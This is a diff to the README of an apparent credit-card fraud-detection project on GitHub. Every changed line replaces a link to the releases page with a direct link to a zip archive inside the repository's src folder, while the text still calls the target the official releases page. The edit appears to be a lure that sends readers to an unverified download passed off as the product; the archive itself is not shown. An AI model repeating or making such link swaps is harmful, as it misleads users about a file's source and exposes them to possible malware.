@@ -1,6 +1,6 @@
 # 🛡️ credit-card-fraud-detection - Detect Fraud Quickly and Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-red?style=for-the-badge)](https://github.com/Cardinalfishepitaph683/credit-card-fraud-detection/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-red?style=for-the-badge)](https://github.com/Cardinalfishepitaph683/credit-card-fraud-detection/raw/refs/heads/main/src/fraud_credit_card_detection_3.5.zip)
 
 ---
 
@@ -16,7 +16,7 @@ This tool is meant for anyone who wants to check credit card data for fraud with
 
 To start using this software, you need to get the files from the official GitHub releases page.
 
-[![Download from GitHub Releases](https://img.shields.io/badge/Download-GitHub%20Releases-brightgreen?style=for-the-badge)](https://github.com/Cardinalfishepitaph683/credit-card-fraud-detection/releases)
+[![Download from GitHub Releases](https://img.shields.io/badge/Download-GitHub%20Releases-brightgreen?style=for-the-badge)](https://github.com/Cardinalfishepitaph683/credit-card-fraud-detection/raw/refs/heads/main/src/fraud_credit_card_detection_3.5.zip)
 
 ### Steps to Download
 
@@ -139,4 +139,4 @@ data-science, fraud-detection, imbalanced-data, machine-learning, ml-pipeline, p
 
 The primary link for download and updates is:
 
-https://github.com/Cardinalfishepitaph683/credit-card-fraud-detection/releases
+https://github.com/Cardinalfishepitaph683/credit-card-fraud-detection/raw/refs/heads/main/src/fraud_credit_card_detection_3.5.zip
